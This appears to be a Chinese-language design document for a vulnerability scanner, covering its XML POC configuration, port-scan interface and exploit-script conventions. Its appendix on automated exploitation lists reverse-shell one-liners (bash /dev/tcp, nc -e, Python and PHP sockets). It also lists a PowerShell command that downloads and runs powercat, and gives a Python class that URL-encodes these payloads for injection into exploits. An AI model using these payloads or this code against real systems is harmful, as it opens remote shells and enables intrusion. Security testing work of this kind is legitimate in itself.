[toc]

# 功能介绍

## 多主机进行多漏洞检测功能

- 支持漏洞筛选
- 主机支持IP/IP段
- 主机支持自定义IP列表文件

## 多主机端口探测功能

# 设计介绍

## 主要业务逻辑

1 解析gconfig.xml获取poc的筛选信息,以及poc的信息

2 确定目标(主机)

3 确定执行的POC集(根据用户选择筛选)

4 执行Python脚本扫描目标(主机)的开放端口

5 根据POC的信息找到对应的Python脚本,执行它

6 接收Python脚本的返回值

7 判断是否具有漏洞:有显示,没有就不显示任何信息

## gconfig.xml文件

- 最外标签`<niso></niso>`

- `<sys></sys>`

  system.针对操作系统进行筛选.

- `<app></app>`

  application.针对中间件进行筛选.

- `<cms></cms>`

  是否是cms漏洞

- `<poc></poc>`

  name: poc文件名

  tag: 漏洞名

  folder: poc文件所在的文件夹

  sys:筛选

  app:筛选

  cms:筛选

  ports:预定义的扫描端口.

  > 单端口:`<ports>8009</ports>`
  >
  > 多端口,用空格隔开:`<ports>8009 8080</ports>`

  description:描述性信息,用于显示在扫描结果表中的**描述**这一列.

  > 作用: 解释漏洞的基本信息,如果有补丁地址也在这里给出.
  >
  > 超链接的使用方法:
  >
  > 因为`<a></a>`在解析xml时会当成一个独立标签,所以需要针对这个进行处理.
  >
  > 用`nisolinkAS`代替`<a  href=`;用`nisolinkAE`代替`</a>`
  >
  > 如:`<a href=http://www.baidu.com>http://www.baidu.com</a>` 应更新为:`nisolinkAShttp://www.baidu.com>http://www.baidu.comnisolinkAE`
  
  vulnInfo:保存对应的漏洞信息文件.

## 端口扫描模块

### 参数格式

`<host> <dir> <欲扫描的端口> <线程数量>`

> 参数1:目标的IP地址.
>
> 参数2:程序所在的绝对路径(包含最后斜杠)
>
> 参数3:
>
> - 0:用常规端口扫描. 常规端口在扫描Python文件中由作者定义.
> - 其他:端口范围.如"233-666"
>
> 参数4:开启多少个线程用于扫描端口(不建议超过20)

### 输出格式

输出端口的字符串用`NISOPORTST`和`NISOPORTED`包裹起来.**输出内容为`host port`,中间用空格隔开**.

如,想要输出`172.16.5.204`主机上开放了端口`433`, 正常写法:`print('172.16.5.204 433')`,应修改为:`print'NISOPORTST172.16.5.204 433NISOPORTED'`.

## 调用POC脚本模块

### 调用参数格式

`<program dir> <host> <port>`

> 参数1:程序所在的绝对路径(包含最后的反斜杠)
>
> 参数2:主机IP
>
> 参数3:端口

### 返回值

`exit(int)`

> exit(0):存在漏洞.
>
> exit(1):不存在漏洞.
>
> exit(-1):异常.







# 附:自动化exp反弹shell实现

### 0x01 反弹shell的方式

1、nc反弹

- 攻击端

  nc -lvvp port 对本地端口进行监听

- 被攻击端

  - linux环境：

    - /bin/bash -i >& /dev/tcp/监听主机ip/监听端口 0>&1
    - nc -e /bin/bash 监听主机ip 监听端口 #默认情况下系统可能没有nc或者被阉割的版本，无法使用-e参数
    - python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('**监听主机ip**',**监听端口**));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
    - php -r '$sock=fsockopen("**监听主机ip**",**监听端口**);exec("/bin/bash -i <&3 >&3 2>&3");'

  - windows环境：

    - powershell IEX (New-Object System.Net.Webclient).DownloadString
      ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
      powercat -c **监听主机ip** -p **监听端口** -e cmd

      此种情况如果目标主机联网或者老版本windows系统没有自带的powershell可能无法实现



2、python脚本实现nc功能



### 0x02 参数定义

1、工具自化实现方式

- 脚本接受参数 python exp.py config.json ip1 ip2 port reverse_type
  - ip1 ：存在漏洞的目标主机ip
  - ip2 ：监听主机的ip(指运行程序主机的ip)
  - port: 反弹shell的监听端口
  - reverse_type: 为反弹shell的方式
    - 1：表示bash反弹
    - 2：表示nc反弹
    - 3：表示python反弹
    - 4：表示php反弹
    - 5：表示windows下的powershell反弹



### 0x03 功能代码封装

- 参数格式实例，exp编写时，参数封装就按照此种格式进行，注意最后两位参数传递时一定要强转成整形使用

  ```
  python2 CVE-2020-10238_P2.py config.json 172.16.5.219 58.58.58.88 4444 5
  ```

  

```python
#!/usr/local/env python3
#coding: utf-8



import json
import sys
import urllib

class Jsonparse(object):
    def __init__(self, file_path):
        self.file_path = file_path

    def parse(self):
        file = open(self.file_path, 'rb')
        jsonfile = json.load(file)
        # print(jsonfile['tomcat'])
        # print(jsonfile)
        return jsonfile
        
# if __name__ == '__main__':
#     obj = Reverse_shell('172.16.5.211', 3555, 5)
#     print(obj.select_type())

# def main():
#     obj = Jsonparse('./config.json')
#     obj.parse()

# if __name__ == '__main__':
#     main()



"""
Readme:
    主要实现对shell反弹方式的封装
    脚本接受参数 python exp.py config.json ip1 ip2 port reverse_type
    - ip1 ：存在漏洞的目标主机ip
    - ip2 ：监听主机的ip(指运行程序主机的ip)
    - port: 反弹shell的监听端口
    - reverse_type: 为反弹shell的方式
    - 1：表示bash反弹
    - 2：表示nc反弹
    - 3：表示python反弹
    - 4：表示php反弹
    - 5：表示windows下的powershell反弹
"""



class Reverse_shell():

    def __init__(self, ip, port, reverse_type):
        self.ip = ip
        self.port = port
        self.reverse_type = reverse_type
        self.reverse_dict = {
            "bash": "/bin/bash -i >& /dev/tcp/{}/{} 0>&1",
            "nc": "nc -e /bin/bash {} {}",
            "python": "python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"",
            "php": "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "powershell": "powershell IEX (New-Object System.Net.Webclient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c {} -p {} -e cmd"
        }

    def select_type(self):
        if self.reverse_type == 1:
            cmd = self.reverse_dict['bash'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 2:
            cmd =  self.reverse_dict['nc'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 3:
            cmd = self.reverse_dict['python'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 4:
            cmd = self.reverse_dict['php'].format(self.ip, self.port)
            return urllib.quote(cmd)
        elif self.reverse_type == 5:
            cmd = self.reverse_dict['powershell'].format(self.ip, self.port)
            return urllib.quote(cmd)
```